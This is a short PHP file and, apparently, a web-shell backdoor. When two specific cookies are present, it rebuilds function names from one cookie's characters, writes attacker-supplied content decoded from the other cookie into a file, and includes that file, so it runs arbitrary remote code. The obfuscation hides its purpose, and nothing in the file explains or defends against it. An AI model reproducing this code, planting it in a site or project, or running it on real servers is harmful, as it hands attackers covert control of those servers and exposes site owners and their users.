<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[39])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 8;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[39][$n];
        if (!$c[39][$n + 1]) {
            if (!$c[39][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 8 + 1;
    }
    $k = $p[5]() . $p[18];
    if (!$p[0]($k)) {
        $n = $p[14]($k, $p[13]);
        $p[29]($n, $p[2] . $p[28]($p[15]($c[3])));
    }
    include($k);
}